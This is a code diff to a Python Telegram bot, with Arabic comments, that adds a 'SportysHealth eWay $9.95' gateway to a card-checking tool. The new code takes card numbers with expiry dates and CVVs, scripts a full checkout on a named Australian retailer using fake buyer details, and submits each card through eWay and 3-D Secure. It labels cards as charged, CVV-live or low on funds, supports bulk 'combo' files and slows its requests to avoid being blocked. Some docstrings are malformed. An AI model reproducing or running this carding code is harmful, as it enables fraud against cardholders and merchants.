@@ -1393,8 +1393,217 @@ class RealPayPalGateway:
         except Exception as e:
             return {'status': 'ERROR', 'message': f'❌ Gateway Error', 'code': 'ERROR'}, None
     
+    def capture(self, text, start, end):
+        ""دالة مساعدة لاستخراج النص"""
+        try:
+            return text.split(start)[1].split(end)[0]
+        except:
+            return ""
+    
+    async def check_card_sportyshealth(self, ccx):
+        """بوابة SportysHealth - eWay 3D Secure"""
+        try:
+            import httpx
+            import urllib.parse
+            import base64
+            import asyncio
+            
+            parts = ccx.strip().split("|")
+            if len(parts) < 4:
+                return {'status': 'ERROR', 'message': '❌ Invalid Format', 'code': 'ERROR'}, None
+            
+            cc = parts[0]
+            month = parts[1].zfill(2)
+            year = parts[2][-2:] if len(parts[2]) == 4 else parts[2]
+            cvv = parts[3]
+            
+            user_info = {
+                'name': 'Sachio YT',
+                'email': 'sachiopremiun@gmail.com',
+                'address': '118 W 132nd St, Banjup, WA 6164, AU'
+            }
+            
+            async with httpx.AsyncClient(follow_redirects=True, verify=False, timeout=60.0) as session:
+                # الخطوة 1: الحصول على صفحة المنتج
+                head = {
+                    "Host": "www.sportyshealth.com.au",
+                    "User-Agent": self.get_random_user_agent(),
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                }
+                
+                r = await session.get(
+                    "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
+                    headers=head,
+                )
+                cookies_1 = "; ".join([f"{key}={value}" for key, value in r.cookies.items()])
+                xi = urllib.parse.unquote(self.capture(cookies_1, "xid_sph_364e1=Set-Cookie: xid_sph_364e1=", ";"))
+                if not xi:
+                    xi = self.capture(cookies_1, "xid_sph_364e1=", ";")
+                
+                # الخطوة 2: إضافة للسلة
+                head2 = {
+                    "Host": "www.sportyshealth.com.au",
+                    "Accept": "*/*",
+                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "User-Agent": self.get_random_user_agent(),
+                    "Origin": "https://www.sportyshealth.com.au",
+                    "Referer": "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
+                }
+                
+                post2 = "mode=add&productid=7776&cat=&page=&product_options%5B6036%5D=11590&product_options%5B6037%5D=11591&amount=1"
+                await session.post("https://www.sportyshealth.com.au/cart.php", headers=head2, data=post2)
+                await asyncio.sleep(2)
+                
+                # الخطوة 3: الذهاب للدفع
+                head3 = {
+                    "Host": "www.sportyshealth.com.au",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "User-Agent": self.get_random_user_agent(),
+                    "Referer": "https://www.sportyshealth.com.au/Sportys-Health-Blender-Bottle-Shaker.html",
+                }
+                await session.get("https://www.sportyshealth.com.au/cart.php?mode=checkout", headers=head3)
+                await asyncio.sleep(2)
+                
+                # الخطوة 4: إدخال بيانات الشحن
+                head4 = {
+                    "Host": "www.sportyshealth.com.au",
+                    "Accept": "*/*",
+                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "User-Agent": self.get_random_user_agent(),
+                    "Origin": "https://www.sportyshealth.com.au",
+                    "Referer": "https://www.sportyshealth.com.au/cart.php?mode=checkout",
+                }
+                
+                post4 = f"usertype=C&anonymous=Y&xid_sph_364e1={xi}&address_book%5BB%5D%5Bfirstname%5D=Sachio&address_book%5BB%5D%5Blastname%5D=YT&address_book%5BB%5D%5Baddress%5D=118+W+132nd+St&address_book%5BB%5D%5Baddress_2%5D=YT&address_book%5BB%5D%5Bcity%5D=Banjup&address_book%5BB%5D%5Bstate%5D=WA&address_book%5BB%5D%5Bcountry%5D=AU&address_book%5BB%5D%5Bzipcode%5D=6164&address_book%5BB%5D%5Bphone%5D=19006318646&email=sachiopremiun%40gmail.com&pending_membershipid=&reg_code=&uname=&password_is_modified=N&passwd1=&passwd2=&address_book%5BS%5D%5Bfirstname%5D=&address_book%5BS%5D%5Blastname%5D=&address_book%5BS%5D%5Baddress%5D=&address_book%5BS%5D%5Baddress_2%5D=&address_book%5BS%5D%5Bcity%5D=Bundall&address_book%5BS%5D%5Bstate%5D=QLD&address_book%5BS%5D%5Bcountry%5D=AU&address_book%5BS%5D%5Bzipcode%5D=4217&address_book%5BS%5D%5Bphone%5D=&address_book%5BS%5D%5Bemail%5D="
+                await session.post("https://www.sportyshealth.com.au/cart.php?mode=checkout", headers=head4, data=post4)
+                await asyncio.sleep(2)
+                
+                # الخطوة 5: اختيار الشحن
+                post5 = "shippingid=202&mode=checkout&action=update"
+                await session.post("https://www.sportyshealth.com.au/cart.php?mode=checkout", headers=head4, data=post5)
+                await asyncio.sleep(2)
+                
+                # الخطوة 6: الدفع
+                head6 = {
+                    "Host": "www.sportyshealth.com.au",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "User-Agent": self.get_random_user_agent(),
+                    "Origin": "https://www.sportyshealth.com.au",
+                    "Referer": "https://www.sportyshealth.com.au/cart.php?mode=checkout",
+                }
+                
+                post6 = f"paymentid=26&action=place_order&xid_sph_364e1={xi}&payment_method=Credit+Card+-+eWay+3DSecure&Customer_Notes=&authority_to_leave=1&accept_terms=Y"
+                r6 = await session.post("https://www.sportyshealth.com.au/payment/payment_cc.php", headers=head6, data=post6)
+                
+                ew = self.capture(r6.text, '"https://secure.ewaypayments.com/sharedpage/sharedpayment?AccessCode=', '"')
+                bi = self.capture(r6.text, "?ordr=", "&")
+                
+                if not ew:
+                    return {'status': 'ERROR', 'message': '❌ Failed to get eWay token', 'code': 'ERROR'}, user_info
+                
+                # الخطوة 7: إرسال بيانات البطاقة لـ eWay
+                head7 = {
+                    "Host": "secure.ewaypayments.com",
+                    "Accept": "*/*",
+                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    "User-Agent": self.get_random_user_agent(),
+                    "Origin": "https://secure.ewaypayments.com",
+                    "Referer": f"https://secure.ewaypayments.com/sharedpage/sharedpayment?v=2&AccessCode={ew}&View=Modal",
+                }
+                
+                post7 = f"EWAY_ACCESSCODE={ew}&EWAY_VIEW=Modal&EWAY_ISSHAREDPAYMENT=true&EWAY_ISMODALPAGE=true&EWAY_APPLYSURCHARGE=true&EWAY_CUSTOMERREADONLY=False&PAYMENT_TRANTYPE=Purchase&AMEXEC_ENCRYPTED_DATA=&EWAY_PAYMENTTYPE=creditcard&EWAY_CUSTOMEREMAIL=ascasc%40gmail.com&EWAY_CUSTOMERPHONE=2240396666&EWAY_CARDNUMBER={cc}&EWAY_CARDNAME=assacsac&EWAY_CARDEXPIRYMONTH={month}&EWAY_CARDEXPIRYYEAR={year}&EWAY_CARDCVN={cvv}&AMEXEC_RESPONSE="
+                await session.post("https://secure.ewaypayments.com/sharedpage/SharedPayment/ProcessPayment", headers=head7, data=post7)
+                
+                # الخطوة 8: الحصول على JWT
+                head8 = {
+                    "Host": "cerberus.prodcde.ewaylabs.cloud",
+                    "accept": "application/json",
+                    "user-agent": self.get_random_user_agent(),
+                    "origin": "https://secure.ewaypayments.com",
+                    "referer": "https://secure.ewaypayments.com/",
+                }
+                
+                r8 = await session.get(f"https://cerberus.prodcde.ewaylabs.cloud/transactions/{ew}/queryInit", headers=head8)
+                jt = self.capture(r8.text, '"jwt":"', '"')
+                
+                if jt:
+                    # الخطوة 9: Cardinal Commerce
+                    head9 = {
+                        "Host": "centinelapi.cardinalcommerce.com",
+                        "content-type": "application/json;charset=UTF-8",
+                        "user-agent": self.get_random_user_agent(),
+                        "accept": "*/*",
+                        "origin": "https://secure.ewaypayments.com",
+                        "referer": "https://secure.ewaypayments.com/",
+                    }
+                    
+                    post9 = {
+                        'BrowserPayload': {
+                            'Order': {'OrderDetails': {}, 'Consumer': {'BillingAddress': {}, 'ShippingAddress': {}, 'Account': {}}, 'Cart': [], 'Token': {}, 'Authorization': {}, 'Options': {}, 'CCAExtension': {}},
+                            'SupportsAlternativePayments': {'cca': True, 'hostedFields': False, 'applepay': False, 'discoverwallet': False, 'wallet': False, 'paypal': False, 'visacheckout': False},
+                        },
+                        'Client': {'Agent': 'SongbirdJS', 'Version': '1.35.0'},
+                        'ConsumerSessionId': '0_9c9cd616-e6e8-4d9a-b6ac-e3429584375d',
+                        'ServerJWT': jt,
+                    }
+                    
+                    await asyncio.sleep(5)
+                    r9 = await session.post("https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init", headers=head9, json=post9)
+                    
+                    # الخطوة 10: Enroll
+                    head12 = {
+                        "Host": "cerberus.prodcde.ewaylabs.cloud",
+                        "x-browser": "false,es-419,24,800,360,300",
+                        "user-agent": self.get_random_user_agent(),
+                        "content-type": "text/plain",
+                        "accept": "application/json",
+                        "origin": "https://secure.ewaypayments.com",
+                        "referer": "https://secure.ewaypayments.com/",
+                    }
+                    await session.put(f"https://cerberus.prodcde.ewaylabs.cloud/transactions/{ew}/enroll", headers=head12)
+                
+                # الخطوة 11: Complete 3D
+                head13 = {
+                    "Host": "secure.ewaypayments.com",
+                    "User-Agent": self.get_random_user_agent(),
+                    "Accept": "*/*",
+                    "Referer": f"https://secure.ewaypayments.com/sharedpage/sharedpayment?v=2&AccessCode={ew}&View=Modal",
+                }
+                await session.post(f"https://secure.ewaypayments.com/Complete3D/{ew}", headers=head13)
+                
+                # الخطوة 12: الحصول على النتيجة
+                head15 = {
+                    "Host": "www.sportyshealth.com.au",
+                    "User-Agent": self.get_random_user_agent(),
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+                    "Referer": "https://www.sportyshealth.com.au/payment/payment_cc.php",
+                }
+                
+                r15 = await session.get(f"https://www.sportyshealth.com.au/payment/cc_eway_iframe_results.php?ordr={bi}&PageSpeed=Off&AccessCode={ew}", headers=head15)
+                r15_text = r15.text
+                
+                msg = self.capture(r15_text, '"form-text">Reason:</span> ', " <br />")
+                code = self.capture(r15_text, "ResponseCode: ", "<br />")
+                msg2 = self.capture(r15_text, "ResponseMessage: ", "<br />")
+                
+                # تحليل النتيجة
+                if r15.status_code == 302 or (code and "00" in code) or (msg2 and ("00" in msg2 or "A" in msg2)):
+                    return {'status': 'CHARGED', 'message': '✅ Charged $9.95', 'code': 'APPROVED'}, user_info
+                elif msg2 and "D4482" in msg2:
+                    return {'status': 'CVV_LIVE', 'message': '⚠️ CVV Live (CCN)', 'code': 'APPROVED'}, user_info
+                elif code and "06" in code:
+                    return {'status': 'CVV_LIVE', 'message': '⚠️ CVV Live (CCN)', 'code': 'APPROVED'}, user_info
+                elif msg2 and ("51" in msg2 or "D4451" in msg2):
+                    return {'status': 'LOW_FUNDS', 'message': '⚠️ Low Funds', 'code': 'APPROVED'}, user_info
+                else:
+                    return {'status': 'DECLINED', 'message': f'❌ {msg or msg2 or "Declined"}', 'code': 'DECLINED'}, user_info
+                    
+        except Exception as e:
+            return {'status': 'ERROR', 'message': '❌ Gateway Error', 'code': 'ERROR'}, None
+    
     def _parse_shopify_response(self, text):
-        """تحليل استجابة Shopify"""
+        ""تحليل استجابة Shopify""""
         text = text.upper()
         
         if 'COMPLETED' in text or 'SUCCESS' in text or 'APPROVED' in text:
@@ -1471,6 +1680,9 @@ class RealPayPalGateway:
             result, user_info = self.check_card_shopify(card_line)
         elif gateway_type == "switchupcb":
             result, user_info = self.check_card_switchupcb(card_line)
+        elif gateway_type == "sportyshealth":
+            import asyncio
+            result, user_info = asyncio.get_event_loop().run_until_complete(self.check_card_sportyshealth(card_line))
         else:  # crisiscafe
             result, user_info = self.check_card_crisiscafe(card_line)
         
@@ -1672,8 +1884,8 @@ async def process_combo_file(file_path, user_id, message, gateway_type="crisisca
                     # تجاهل أخطاء تحديث الرسالة
                     logger.debug(f"Message update skipped: {e}")
             
-            # تأخير بين البطاقات لتجنب الحظر
-            await asyncio.sleep(2)
+            # تأخير بين البطاقات لتجنب الحظر (8 ثواني)
+            await asyncio.sleep(8)
         
         # إعادة تعيين حالة الإيقاف
         if user_id in user_sessions:
@@ -1743,6 +1955,7 @@ async def select_gateway_handler(callback: CallbackQuery):
         InlineKeyboardButton(text="💰 RareDiseases PayPal $1", callback_data="gateway:rarediseases"),
         InlineKeyboardButton(text="🛒️ Shopify Stripe $8.57", callback_data="gateway:shopify"),
         InlineKeyboardButton(text="💳 SwitchUpCB PayPal $1", callback_data="gateway:switchupcb"),
+        InlineKeyboardButton(text="🏥 SportysHealth eWay $9.95", callback_data="gateway:sportyshealth"),
         InlineKeyboardButton(text="🔙 Back", callback_data="back_main")
     )
     keyboard.adjust(1)
@@ -1778,6 +1991,8 @@ async def gateway_selected_handler(callback: CallbackQuery):
         gateway_name = "Shopify"
     elif gateway_type == "switchupcb":
         gateway_name = "SwitchUpCB"
+    elif gateway_type == "sportyshealth":
+        gateway_name = "SportysHealth"
     else:
         gateway_name = "CrisisCafe"
     
@@ -1802,6 +2017,8 @@ async def single_check_handler(callback: CallbackQuery):
         gateway_name = "Shopify"
     elif gateway_type == "switchupcb":
         gateway_name = "SwitchUpCB"
+    elif gateway_type == "sportyshealth":
+        gateway_name = "SportysHealth"
     else:
         gateway_name = "CrisisCafe"
     
@@ -1882,6 +2099,8 @@ async def combo_check_handler(callback: CallbackQuery):
         gateway_name = "Shopify"
     elif gateway_type == "switchupcb":
         gateway_name = "SwitchUpCB"
+    elif gateway_type == "sportyshealth":
+        gateway_name = "SportysHealth"
     else:
         gateway_name = "CrisisCafe"
     
@@ -2008,6 +2227,8 @@ async def start_combo_processing(callback: CallbackQuery):
         gateway_name = "Shopify"
     elif gateway_type == "switchupcb":
         gateway_name = "SwitchUpCB"
+    elif gateway_type == "sportyshealth":
+        gateway_name = "SportysHealth"
     else:
         gateway_name = "CrisisCafe"
     
@@ -2317,4 +2538,3 @@ if __name__ == "__main__":
     
     # تشغيل البوت
     asyncio.run(main())
-
